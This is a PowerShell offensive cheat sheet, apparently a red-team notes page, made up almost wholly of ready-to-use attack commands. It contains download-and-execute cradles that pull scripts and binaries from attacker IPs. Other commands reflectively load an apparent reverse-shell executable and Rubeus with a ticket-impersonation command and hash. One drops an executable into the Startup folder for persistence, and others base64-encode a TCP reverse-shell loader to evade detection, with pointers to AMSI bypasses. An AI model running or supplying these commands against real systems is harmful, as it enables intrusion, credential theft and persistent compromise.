### PowerShell one-liners

#### Load PowerShell script reflectively

Proxy-aware:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```

Non-proxy aware:

```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```

> Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter).

#### Load C# assembly reflectively

Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, [refer here for details](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/).

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

#### Download file

```powershell
# Any version
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")

# Powershell 4+
## You can use 'IWR' as a shorthand
Invoke-WebRequest "http://10.10.16.7/Incnspc64.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"
```

#### Encode command

Encode one-liner:

```powershell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```

Or, the Linux version of the above:

```bash
echo 'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
```

Encode existing script, copy to clipboard:

```powershell
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('c:\path\to\PowerView.ps1')) | clip
```

Run it, bypassing execution policy.

```powershell
Powershell -EncodedCommand $encodedCommand
```

> If you have Nishang handy, you can use [Invoke-Encode.ps1](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1).